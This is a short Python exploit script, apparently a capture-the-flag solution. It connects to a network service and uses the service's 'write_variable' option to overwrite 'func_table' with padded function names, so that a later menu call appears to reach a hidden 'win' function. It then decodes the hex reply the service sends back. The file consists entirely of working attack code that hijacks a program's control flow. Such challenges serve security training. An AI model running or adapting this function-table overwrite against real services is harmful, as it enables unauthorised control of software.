#!/usr/bin/env python3
import sys
import time
import socket


def receive(s):
        return s.recv(1024).decode()


def consign(s, message):
        message += '\x0a'
        s.send(message.encode())
        time.sleep(0.15)
        return receive(s)


def decode_buffer(buffer):
        buffer = buffer.split(' ')
        clean = ''
        for c in buffer:
                clean += chr(int(c[2:], 16))
        print(clean)


def main():
        try:
                host = sys.argv[1]
                port = int(sys.argv[2])
        except Exception as e:
                print('Usage: %s <host> <port>' % sys.argv[0])
                print(e)
                sys.exit(-1)

        try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((host, port))
                        print(f'Sending evil buffer to {host}:{port}...')
                        receive(s)
                        consign(s, '3') # write_variable
                        consign(s, 'func_table')
                        consign(s, '\"print_table                            read_variable                            write_variable                               win\"') # new value for func_table
                        buffer = consign(s, '4')
                        print(buffer[:-6]) # Exclude '==>'
                        print('\nTrying to decode received buffer...')
                        time.sleep(0.25)
                        decode_buffer(buffer[:-6])
        except Exception as e:
                print(e)
                sys.exit(-1)



if __name__ == '__main__':
        main()
